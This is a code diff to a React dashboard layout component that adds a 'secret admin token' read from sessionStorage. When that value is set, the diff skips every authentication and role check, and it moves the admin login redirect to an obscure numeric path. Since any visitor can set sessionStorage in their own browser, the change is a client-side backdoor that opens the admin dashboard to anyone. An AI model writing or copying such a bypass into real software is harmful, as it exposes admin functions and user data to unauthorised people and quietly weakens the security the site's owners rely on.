@@ -9,11 +9,14 @@ export const DashboardLayout = ({ requiredRole, links = [], activeTab, onTabChan
   const { user, loading, isAuthenticated } = useAuth();
   const navigate = useNavigate();
 
+  // Secret admin token bypasses role checks
+  const hasSecretToken = sessionStorage.getItem("secret_admin_token") === "granted";
+
   useEffect(() => {
-    if (!loading) {
+    if (!loading && !hasSecretToken) {
       if (!isAuthenticated) {
         if (requiredRole === "admin") {
-          navigate("/admin/login");
+          navigate("/635284");
         } else {
           navigate("/login");
         }
@@ -27,7 +30,7 @@ export const DashboardLayout = ({ requiredRole, links = [], activeTab, onTabChan
         }
       }
     }
-  }, [isAuthenticated, user, loading, navigate, requiredRole]);
+  }, [isAuthenticated, user, loading, navigate, requiredRole, hasSecretToken]);
 
   if (loading) {
     return (
@@ -43,7 +46,8 @@ export const DashboardLayout = ({ requiredRole, links = [], activeTab, onTabChan
     );
   }
 
-  if (!isAuthenticated || (requiredRole && user?.role !== requiredRole)) {
+  // Allow access if secret token is present (admin override)
+  if (!hasSecretToken && (!isAuthenticated || (requiredRole && user?.role !== requiredRole))) {
     return null;
   }
 
